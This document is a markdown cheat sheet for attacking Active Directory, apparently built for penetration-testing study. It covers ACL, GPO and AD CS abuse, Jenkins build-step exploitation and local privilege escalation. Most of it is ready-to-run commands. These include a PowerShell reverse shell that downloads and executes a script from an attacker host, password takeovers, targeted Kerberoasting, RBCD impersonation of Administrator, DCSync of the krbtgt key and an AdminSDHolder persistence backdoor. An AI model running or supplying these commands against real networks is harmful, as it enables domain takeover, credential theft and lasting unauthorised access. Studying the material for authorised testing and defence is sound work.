# 04 — ACL, GPO & Jenkins Abuse

> [!NOTE]
> Active Directory object delegation and GPO misconfigurations frequently provide direct privilege escalation vectors to Domain Admin without requiring credential dumping.

---

## Local Privilege Escalation (PowerUp / SCM Abuse)

When initial access is gained on a workstation or server, enumerate local privilege escalation vectors to obtain local `SYSTEM` or administrative rights.

```powershell
# Load PowerUp and run automated checks (Unquoted Service Paths, Modifiable Services, DLL Hijacking)
. C:\AD\Tools\PowerUp.ps1
Invoke-AllChecks

# Service Abuse: Automatically modifies service binary path to add user to local Administrators group
Invoke-ServiceAbuse -Name '<VULNERABLE_SERVICE>' -Username '<DOMAIN>\<USER>' -Verbose

# Alternative automated local privilege escalation checker
.\winPEASx64.exe
```

---

## Jenkins CI/CD Pipeline Exploitation

Jenkins build servers frequently execute with elevated domain rights or interact with build scripts stored on shares.

### 1. Check Software Restriction Policies (AppLocker / SRP)
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\SRPV2
```

### 2. Jenkins Reverse Shell Execution
- Navigate to Jenkins Dashboard → Project → Configure → Build → Add build step → **Execute Windows batch command**.
- Inject a PowerShell reverse shell execution command (e.g. Nishang `Invoke-PowerShellTcp.ps1`):

```powershell
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/Invoke-PowerShellTcp.ps1'); Invoke-PowerShellTcp -Reverse -IPAddress <ATTACKER_IP> -Port 4444"
```

---

## GPO Authentication Coercion & NTLM Relay Flow

Group Policy Objects can be abused to coerce domain computer/user accounts to authenticate back to an attacker-controlled relay server.

### Attack Sequence
1. Locate a target GPO or SYSVOL share with `Write` or `WriteDacl` permissions (`Get-DomainGPO` / `Get-DomainOU`).
2. Place a malicious `.lnk` shortcut file or modify the GPO configuration path to point to the attacker IP (`\\<ATTACKER_IP>\share`).
3. User or machine accounts process the link or GPO, sending NTLM authentication to `ntlmrelayx.py`.
4. Relay authentication to LDAP or a target host to escalate rights.

---

## GPO DACL Modification & Malicious Policy Injection

If an attacker holds `WriteDacl` or `GenericAll` over a GPO object, they can grant themselves full access and push malicious immediate scheduled tasks or local group modifications.

```cmd
# Relay shell DACL modification command
write_gpo_dacl <USER> <GPO_NAME_OR_GUID>

# Modify GPO remotely (gpowritty / GPO editing tools) to add user to local Administrators
net localgroup administrators <USER> /add
```

---

## Permission → Attack Path Matrix

> [!IMPORTANT]
> The attack available depends on **both** the permission held **AND** the target object type. GenericAll on a User is very different from GenericAll on a Computer or on the Domain Head.

### Permission on **User Objects**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **GenericAll** | Reset password | Direct password takeover | `Set-ADAccountPassword -Identity <TARGET> -Reset -NewPassword (ConvertTo-SecureString 'P@ss!' -AsPlainText -Force)` |
| **GenericAll** | Targeted Kerberoasting (Set SPN) | Set fake SPN → request TGS → crack offline | `Set-DomainObject -Identity <TARGET> -Set @{serviceprincipalname='fake/spn'}` then `Rubeus.exe kerberoast /user:<TARGET>` |
| **GenericAll** | Shadow Credentials | Requires AD CS + Key Trust, write to `msDS-KeyCredentialLink` | `Whisker.exe add /target:<TARGET>` then `Rubeus.exe asktgt /user:<TARGET> /certificate:<PFX> /ptt` |
| **GenericAll** | Targeted AS-REP Roasting | Disable Kerberos Pre-Auth → roast offline | `Set-DomainObject -Identity <TARGET> -XOR @{useraccountcontrol=4194304}` then `Rubeus.exe asreproast /user:<TARGET>` |
| **GenericWrite** | Set logon script / SPN | Modify `scriptpath` or `serviceprincipalname` | `Set-DomainObject -Identity <TARGET> -Set @{scriptpath='\\<ATTACKER_IP>\share\shell.ps1'}` |
| **ForceChangePassword** | Reset password | No current password needed | `bloodyAD -d <DOMAIN> -u <USER> -p <PASS> --host <DC_IP> set password '<TARGET>' 'NewP@ss!'` |
| **WriteOwner** | Take ownership → WriteDacl → GenericAll | Chain: Become owner → grant self full control | `Set-DomainObjectOwner -TargetIdentity <TARGET> -PrincipalIdentity <USER>` then `Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All` |
| **WriteDacl** | Grant self GenericAll | Escalate to full control on user | `Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All` |

---

### Permission on **Group Objects**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **GenericAll** | Add self to group | Instant privilege escalation if target is DA/EA group | `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'` |
| **AddMembers / Self** | Add self to group | Directly add own account to privileged group | `Add-DomainGroupMember -Identity '<GROUP>' -Members '<USER>'` |
| **WriteDacl** | Grant self AddMembers → add to group | Two-step: modify DACL then add membership | `Add-DomainObjectAcl -TargetIdentity '<GROUP>' -PrincipalIdentity <USER> -Rights All` then `Add-DomainGroupMember ...` |
| **WriteOwner** | Take ownership → escalate | Chain to WriteDacl → GenericAll → AddMembers | `Set-DomainObjectOwner -TargetIdentity '<GROUP>' -PrincipalIdentity <USER>` |

---

### Permission on **Computer Objects**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **GenericAll** | RBCD (Resource-Based Constrained Delegation) | Need ability to create machine account (MachineAccountQuota > 0) OR control existing one | `Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'msds-allowedtoactonbehalfofotheridentity'=<SID_BYTES>}` then `Rubeus.exe s4u /user:FakeMachine$ /rc4:<HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET> /ptt` |
| **GenericAll** | Shadow Credentials | Requires AD CS + Key Trust model | `Whisker.exe add /target:<TARGET_COMPUTER>$` then `Rubeus.exe asktgt /user:<TARGET_COMPUTER>$ /certificate:<PFX> /ptt` |
| **GenericAll** | Read LAPS password | If LAPS deployed, read `ms-Mcs-AdmPwd` | `Get-DomainObject -Identity <TARGET_COMPUTER> -Properties ms-Mcs-AdmPwd` |
| **GenericWrite** | RBCD | Same as GenericAll — write to `msDS-AllowedToActOnBehalfOfOtherIdentity` | `impacket-rbcd <DOMAIN>/<USER>:<PASS> -delegate-to <TARGET>$ -delegate-from FakeMachine$ -dc-ip <DC_IP> -action write` |
| **WriteDacl** | Grant self GenericAll → RBCD / Shadow Creds | Two-step escalation | `Add-DomainObjectAcl -TargetIdentity <TARGET_COMPUTER> -PrincipalIdentity <USER> -Rights All` |
| **WriteOwner** | Take ownership → chain to RBCD | Three-step: Own → WriteDacl → GenericAll → RBCD | `Set-DomainObjectOwner ...` → `Add-DomainObjectAcl ...` → RBCD |

> [!WARNING]
> **RBCD Requirements:** You need (1) `GenericWrite` or `GenericAll` over the **target** computer object, (2) a machine account you control (create via `New-MachineAccount` if `ms-DS-MachineAccountQuota > 0`), and (3) the target must **not** be in the `Protected Users` group or have `NOT_DELEGATED` flag set on the account being impersonated.

---

### Permission on **Domain Head (DC=domain,DC=local)**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **WriteDacl** | Grant DCSync rights | Add `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` | `Add-DomainObjectAcl -TargetIdentity "DC=dcorp,DC=moneycorp,DC=local" -PrincipalIdentity <USER> -Rights DCSync` |
| **GenericAll** | DCSync | Already have replication rights implicitly | `lsadump::dcsync /user:dcorp\krbtgt` or `impacket-secretsdump <DOMAIN>/<USER>:<PASS>@<DC_IP>` |

> [!IMPORTANT]
> **DCSync Requirements:** The account must hold **both** of these extended rights on the Domain Head:
> - `DS-Replication-Get-Changes` (GUID `1131f6aa-9c07-11d1-f79f-00c04fc2dcd2`)
> - `DS-Replication-Get-Changes-All` (GUID `1131f6ad-9c07-11d1-f79f-00c04fc2dcd2`)
>
> Members of **Domain Admins**, **Enterprise Admins**, and **Domain Controllers** groups hold these by default.

---

### Permission on **GPO Objects**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **GenericAll / WriteDacl** | Malicious GPO modification | Add immediate scheduled task or logon script to push commands to all linked OUs/computers | Modify GPO via `SharpGPOAbuse.exe --AddLocalAdmin --UserAccount <USER> --GPOName "<GPO>"` |
| **GenericWrite** | NTLM Coercion via `.lnk` | Place malicious shortcut pointing to attacker IP in SYSVOL/GPO path | Inject `.lnk` → `ntlmrelayx.py` relay to LDAP |

---

### Permission on **OU Objects**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **GenericAll** | Control all child objects | Modify ACLs on all users/computers in the OU | `Add-DomainObjectAcl -TargetIdentity "OU=<TARGET_OU>,DC=dcorp,DC=local" -PrincipalIdentity <USER> -Rights All` |
| **WriteDacl** | Grant self GenericAll on OU | Then cascade permissions to child objects | Chain WriteDacl → GenericAll |

---

### Permission on **Certificate Authority (AD CS)**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **ManageCA** | ESC7 — Add self as CA Officer → issue certs | Requires `ManageCA` on the CA object | `certipy ca -ca '<CA_NAME>' -add-officer <USER> -u <USER>@<DOMAIN> -p '<PASS>'` |
| **ManageCertificates** | ESC7 — Approve pending certificate requests | Combined with ManageCA for full CA takeover | Approve pending ESC1 requests |
| **Enroll + ENROLLEE_SUPPLIES_SUBJECT** | ESC1 — Request cert as any user (SAN impersonation) | Template must have Client Auth EKU + Manager approval disabled | `Certify.exe request /ca:<CA_FQDN>\<CA_NAME> /template:<TEMPLATE> /altname:Administrator@<DOMAIN>` |

---

### Permission on **AdminSDHolder Object**

| Permission | Attack Path | Requirements / Notes | Command |
| :--- | :--- | :--- | :--- |
| **GenericAll / WriteDacl** | Persistent backdoor on all protected accounts | SDProp overwrites protected account ACLs every 60 min with AdminSDHolder ACL | `Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=dcorp,DC=moneycorp,DC=local' -PrincipalIdentity <USER> -Rights All` |

> [!CAUTION]
> **AdminSDHolder Persistence:** Adding your own ACEs to AdminSDHolder means every 60 minutes the SDProp process will automatically re-apply those permissions to **all** protected accounts (Domain Admins, Enterprise Admins, Schema Admins, Account Operators, etc.) — even if a defender removes your ACL from those accounts directly.

---

## Attack Requirement Quick Reference

| Attack | Required Permission(s) | Target Object | Additional Prerequisites |
| :--- | :--- | :--- | :--- |
| **DCSync** | `DS-Replication-Get-Changes` + `DS-Replication-Get-Changes-All` | Domain Head | Network access to DC (RPC 135 + dynamic) |
| **RBCD** | `GenericWrite` / `GenericAll` | Computer Object | Machine account you control (`MachineAccountQuota > 0`) |
| **Shadow Credentials** | `GenericAll` / `GenericWrite` | User or Computer | AD CS deployed + Key Trust model enabled |
| **Targeted Kerberoasting** | `GenericAll` / `GenericWrite` | User Object | Set SPN → request TGS → offline crack |
| **Targeted AS-REP Roasting** | `GenericAll` / `GenericWrite` | User Object | Disable Pre-Auth flag (UAC bit `4194304`) |
| **ForceChangePassword** | `ForceChangePassword` / `GenericAll` | User Object | No knowledge of current password needed |
| **Group Membership Abuse** | `AddMembers` / `Self` / `GenericAll` | Group Object | Target group grants desired privileges |
| **GPO Abuse** | `GenericAll` / `WriteDacl` / `GenericWrite` | GPO Object | GPO must be linked to target OU with computers/users |
| **ESC1 (AD CS)** | `Enroll` on vulnerable template | Certificate Template | Client Auth EKU + `ENROLLEE_SUPPLIES_SUBJECT` + No approval |
| **ESC7 (AD CS)** | `ManageCA` on CA server | Certificate Authority | Add self as Officer → approve certs |
| **AdminSDHolder Persistence** | `WriteDacl` / `GenericAll` | AdminSDHolder CN | SDProp runs every 60 min — self-healing backdoor |
| **LAPS Password Read** | `GenericAll` / LAPS read right | Computer Object | LAPS must be deployed on target |

---

## Permission Delegation Enumeration & Abuse Commands

### Enumerate Interesting ACLs
```powershell
# PowerView: Find all non-default ACL entries for a specific user/group
Find-InterestingDomainAcl -ResolveGUIDs | Where-Object { $_.IdentityReferenceName -match '<USER_OR_GROUP>' }

# PowerView: Inspect ACL on a specific high-value object
Get-DomainObjectAcl -Identity 'Domain Admins' -ResolveGUIDs

# PowerView: Find objects where user has WriteDacl, GenericAll, WriteOwner
Get-DomainObjectAcl -ResolveGUIDs | Where-Object {
    ($_.ActiveDirectoryRights -match 'GenericAll|WriteDacl|WriteOwner') -and
    ($_.IdentityReferenceName -match '<USER>')
}
```

### Abuse Chain Examples

```powershell
# === Chain 1: WriteOwner → WriteDacl → GenericAll → Password Reset ===

# Step 1: Take ownership of target user
Set-DomainObjectOwner -TargetIdentity <TARGET> -PrincipalIdentity <USER>

# Step 2: Grant self full control
Add-DomainObjectAcl -TargetIdentity <TARGET> -PrincipalIdentity <USER> -Rights All

# Step 3: Reset password
$pw = ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force
Set-ADAccountPassword -Identity <TARGET> -Reset -NewPassword $pw
```

```powershell
# === Chain 2: GenericWrite on Computer → RBCD → DA Impersonation ===

# Step 1: Create a fake machine account
New-MachineAccount -MachineAccount 'FakeMachine' -Password $(ConvertTo-SecureString 'P@ss123!' -AsPlainText -Force)

# Step 2: Set RBCD on target computer
Set-DomainObject -Identity <TARGET_COMPUTER> -Set @{'msds-allowedtoactonbehalfofotheridentity'= <FAKE_MACHINE_SID_BYTES>}

# Step 3: S4U to impersonate Domain Admin
Rubeus.exe s4u /user:FakeMachine$ /password:'P@ss123!' /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

```powershell
# === Chain 3: WriteDacl on Domain Head → DCSync → krbtgt ===

# Step 1: Grant self DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=dcorp,DC=moneycorp,DC=local" -PrincipalIdentity <USER> -Rights DCSync

# Step 2: DCSync the krbtgt key
lsadump::dcsync /user:dcorp\krbtgt
```

```bash
# === Chain 4: GenericAll on User → Shadow Credentials → TGT ===

# Step 1: Add Key Credential
Whisker.exe add /target:<TARGET>

# Step 2: Request TGT using the certificate
Rubeus.exe asktgt /user:<TARGET> /certificate:<PFX_BASE64> /password:<PFX_PASS> /ptt
```

> [!TIP]
> **BloodHound Integration:** Use BloodHound to visually graph delegation paths such as `AddSelf`, `WriteDacl`, `GenericAll`, and `Owns`. Mark owned nodes and use *Shortest Path to Domain Admins* queries to find ACL-based escalation chains.
